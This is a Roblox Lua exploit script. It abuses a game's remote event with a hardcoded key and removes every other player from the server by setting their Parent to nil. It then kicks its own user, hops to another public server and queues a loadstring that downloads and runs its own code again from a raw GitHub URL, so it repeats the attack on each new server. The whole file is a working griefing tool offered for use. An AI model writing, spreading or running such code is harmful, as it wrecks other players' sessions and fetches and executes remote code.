local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local gameId = game.PlaceId  -- Current game ID
local apiUrl = "https://games.roblox.com/v1/games/" .. gameId .. "/servers/Public?sortOrder=Asc&limit=100"

local function getSigmacode()
    return 'EMMFOSS__!ZCNSJNXCSDWQSANBX'
end

local function fireRemote(method, args)
    game:GetService("ReplicatedStorage").ALLREMBINDS.MainRemoteEvent:FireServer(getSigmacode(), method, args)
end

-- Function to find a new server
local function getNewServer()
    local success, response = pcall(function()
        return HttpService:GetAsync(apiUrl)
    end)

    if success then
        local data = HttpService:JSONDecode(response)
        for _, server in pairs(data.data) do
            if server.playing < server.maxPlayers then
                return server.id  -- Return the best server ID
            end
        end
    end
    return nil
end

-- Main Loop to Kick Other Players
for _, v in pairs(Players:GetPlayers()) do
    task.spawn(function()
        if v.Name ~= Players.LocalPlayer.Name then
            fireRemote("ChangeProptyOfSmtHSH", { v, "Parent", nil })
            repeat task.wait() until #Players:GetPlayers() == 1
            Players.LocalPlayer:Kick("shutdown!") -- Kick yourself with shutdown message
        end
    end)
end

-- Handle teleporting & re-executing script
Players.LocalPlayer.OnTeleport:Connect(function(state)
    if state == Enum.TeleportState.Started then
        if queue_on_teleport then
            queue_on_teleport([[
                loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/omg!.lua"))()
            ]])
        end
    end
end)

-- Detect kick and rejoin
task.spawn(function()
    local coreGui = game:GetService("CoreGui")
    while true do
        task.wait(1)
        for _, v in pairs(coreGui:GetChildren()) do
            if v:IsA("ScreenGui") and v:FindFirstChild("ErrorMessage") then
                local message = v.ErrorMessage.Text
                if message == "shutdown!" then
                    task.wait(2) -- Small delay before rejoining
                    local newServerId = getNewServer()
                    if newServerId then
                        TeleportService:TeleportToPlaceInstance(gameId, newServerId, Players.LocalPlayer)
                    else
                        warn("No available servers to join!")
                    end
                end
            end
        end
    end
end)
